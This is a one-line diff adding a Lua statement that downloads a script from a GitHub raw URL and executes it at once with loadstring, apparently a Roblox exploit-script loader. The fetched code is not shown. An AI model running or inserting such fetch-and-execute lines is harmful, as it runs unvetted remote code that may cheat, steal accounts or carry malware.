@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yopapa699/Main/main/MainLoader.lua"))()
